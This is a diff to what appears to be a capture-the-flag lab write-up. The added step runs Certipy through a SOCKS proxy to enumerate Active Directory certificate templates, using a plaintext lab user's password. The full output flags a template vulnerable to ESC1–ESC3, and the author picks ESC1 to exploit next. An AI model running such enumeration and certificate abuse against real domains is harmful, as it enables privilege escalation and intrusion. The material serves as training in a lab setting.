@@ -448,6 +448,107 @@ socks5  127.0.0.1 1080
 Ive added the port from the socks proxy to `/etc/proxychains.conf`
 
 ```python
+proxychains certipy-ad find -u nigel.mills@shibuya.vl -p 'Sail2Boat3' -dc-ip 10.129.234.42 -vulnerable -stdout
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:636  ...  OK
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'shibuya-AWSJPDC0522-CA' via RRP
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:445  ...  OK
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'shibuya-AWSJPDC0522-CA'
+[*] Checking web enrollment for CA 'shibuya-AWSJPDC0522-CA' @ 'AWSJPDC0522.shibuya.vl'
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:80  ...  OK
+[!] Error checking web enrollment: Server disconnected without sending a response.
+[!] Use -debug to print a stacktrace
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:443  ...  OK
+[!] Error checking web enrollment: [SSL: UNEXPECTED_EOF_WHILE_READING] EOF occurred in violation of protocol (_ssl.c:1033)
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : shibuya-AWSJPDC0522-CA
+    DNS Name                            : AWSJPDC0522.shibuya.vl
+    Certificate Subject                 : CN=shibuya-AWSJPDC0522-CA, DC=shibuya, DC=vl
+    Certificate Serial Number           : 2417712CBD96C58449CFDA3BE3987F52
+    Certificate Validity Start          : 2025-02-15 07:24:14+00:00
+    Certificate Validity End            : 2125-02-15 07:34:13+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : SHIBUYA.VL\Administrators
+      Access Rights
+        ManageCa                        : SHIBUYA.VL\Administrators
+                                          SHIBUYA.VL\Domain Admins
+                                          SHIBUYA.VL\Enterprise Admins
+        ManageCertificates              : SHIBUYA.VL\Administrators
+                                          SHIBUYA.VL\Domain Admins
+                                          SHIBUYA.VL\Enterprise Admins
+        Enroll                          : SHIBUYA.VL\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : ShibuyaWeb
+    Display Name                        : ShibuyaWeb
+    Certificate Authorities             : shibuya-AWSJPDC0522-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : True
+    Any Purpose                         : True
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Any Purpose
+                                          Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 100 years
+    Renewal Period                      : 75 years
+    Minimum RSA Key Length              : 4096
+    Template Created                    : 2025-02-15T07:37:49+00:00
+    Template Last Modified              : 2025-02-19T10:58:41+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SHIBUYA.VL\t1_admins
+                                          SHIBUYA.VL\Domain Admins
+                                          SHIBUYA.VL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SHIBUYA.VL\_admin
+        Full Control Principals         : SHIBUYA.VL\Domain Admins
+                                          SHIBUYA.VL\Enterprise Admins
+        Write Owner Principals          : SHIBUYA.VL\Domain Admins
+                                          SHIBUYA.VL\Enterprise Admins
+        Write Dacl Principals           : SHIBUYA.VL\Domain Admins
+                                          SHIBUYA.VL\Enterprise Admins
+        Write Property Enroll           : SHIBUYA.VL\Domain Admins
+                                          SHIBUYA.VL\Enterprise Admins
+    [+] User Enrollable Principals      : SHIBUYA.VL\t1_admins
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+      ESC2                              : Template can be used for any purpose.
+      ESC3                              : Template has Certificate Request Agent EKU set.
+```
+As seen here is is vulnerable to ESC1 and others as well but since ESC1 is the simplest ill chose that one
+
+```python
 
 ```
 
